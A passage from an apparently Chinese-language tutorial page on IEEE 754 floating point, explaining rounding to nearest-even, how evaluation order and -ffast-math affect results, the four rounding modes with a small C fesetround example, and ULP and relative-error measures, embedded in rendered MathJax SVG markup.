16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(9778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(10278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(10778,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(11278,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(11778,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(12278,0)"></path></g><g data-mml-node="mi" transform="translate(12778,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(13556,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span>
但由于尾数只有23位，所以需要进行舍入，默认是<strong>最接近偶数舍入</strong>，也就是舍入后最后一位为0，在这里就相当于向下舍入了，所以<code>x + 1</code>被舍入回<code>x</code>。</p>
<p><strong>浮点运算顺序影响结果</strong></p>
<p>浮点运算的结果<strong>可能取决于计算顺序</strong>，即使它们在数学上是等价的。</p>
<p>在数学上，加法和乘法满足： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="24.51ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10833.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1183.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2183.4,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2673.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3284.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4284.9,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(5027.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(6083.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(6877.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(7877.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8266.9,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8979.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(9979.3,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(10444.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 但在浮点计算中，由于舍入误差： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="24.51ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10833.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1183.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2183.4,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2673.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3284.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4284.9,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(5027.7,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mi" transform="translate(6083.4,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(6877.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(7877.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(8266.9,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8979.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(9979.3,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(10444.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 在某些情况下，这些计算顺序的不同可能导致不同的最终结果。</p>
<p>通常，编译器不会随意调整计算顺序，以保证符合 IEEE 754
规范。但如果开启
<strong><code>-ffast-math</code></strong>（GCC/Clang），编译器会<strong>忽略一些浮点计算的精度规则</strong>，可能会：</p>
<ul>
<li>重新排序运算，提高性能</li>
<li>产生不同的浮点计算结果</li>
</ul>
<p>如果在上面的 <code>x++</code> 循环代码中开启
<code>-ffast-math</code>，程序可能会<strong>跳过中间精度检查</strong>，从而最终得到
<strong>33554432</strong>，但这也可能带来更大的舍入误差。</p>
<p><strong>不同的舍入模式</strong></p>
<p>除了默认的<strong>向偶数舍入（Banker’s Rounding）</strong>，IEEE 754
还提供了 <strong>4 种舍入模式</strong>：</p>
<table>
<colgroup>
<col style="width: 49%">
<col style="width: 50%">
</colgroup>
<thead>
<tr>
<th><strong>舍入模式</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Round to Nearest (默认)</strong></td>
<td>取最近的可表示值，在两边距离相等时取偶数</td>
</tr>
<tr>
<td><strong>Round Up (<code>FE_UPWARD</code>)</strong></td>
<td>向 <code>+∞</code> 方向舍入（负数趋向于 <code>0</code>）</td>
</tr>
<tr>
<td><strong>Round Down (<code>FE_DOWNWARD</code>)</strong></td>
<td>向 <code>-∞</code> 方向舍入（负数远离 <code>0</code>）</td>
</tr>
<tr>
<td><strong>Round Toward Zero (<code>FE_TOWARDZERO</code>)</strong></td>
<td>直接截断，不做四舍五入</td>
</tr>
</tbody>
</table>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fenv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">fesetround</span>(FE_UPWARD);  <span class="comment">// 设置为向上舍入</span></span><br><span class="line">    <span class="type">float</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">25</span>); i++)</span><br><span class="line">        x++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%f\n"</span>, x);  <span class="comment">// 输出 2^26 = 67108864</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>解释</strong></p>
<ul>
<li>在 <code>2^24</code> 之后，每次 <code>x + 1</code> 被舍入到
<code>x + 2</code>，因此增长速度<strong>翻倍</strong>。</li>
<li>继续增长到 <code>2^25</code> 后，每次 <code>x + 1</code> 会被舍入到
<code>x + 4</code>，增长速度再翻倍。</li>
<li>最终 <code>x</code> 以四倍速增长，达到
<code>2^26 = 67108864</code>。</li>
</ul>
<h5 id="误差测量">误差测量</h5>
<p>在计算机执行浮点数运算时，我们通常关心
<strong>两种误差测量方式</strong>：</p>
<ol type="1">
<li><p><strong>单位最后一位误差（ULP, Units in the Last
Place）</strong></p>
<ul>
<li>这是衡量计算结果和真实值之间的偏差，以
<strong>可表示浮点数单位</strong> 计算的误差。</li>
<li>例如，如果某个计算结果比真实值小 <strong>1
ULP</strong>，意味着它比实际值小了一个可表示的浮点数单位。</li>
<li>在 IEEE 754 标准下，单次基本运算的最坏情况 <strong>不会超过 0.5
ULP</strong>，因为采用的是“四舍五入到最接近可表示数”策略。</li>
</ul></li>
<li><p><strong>相对误差</strong></p>
<ul>
<li><p>计算公式： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.17ex;" xmlns="http://www.w3.org/2000/svg" width="7.841ex" height="5.492ex" role="img" focusable="false" viewBox="0 -1468.5 3465.9 2427.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(985.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(1985.4,0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(518,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(2747.9,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(1212.4,-709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(763,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="3225.9" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span> 其中，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.097ex" height="1.027ex" role="img" focusable="false" viewBox="0 -443 485 454"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 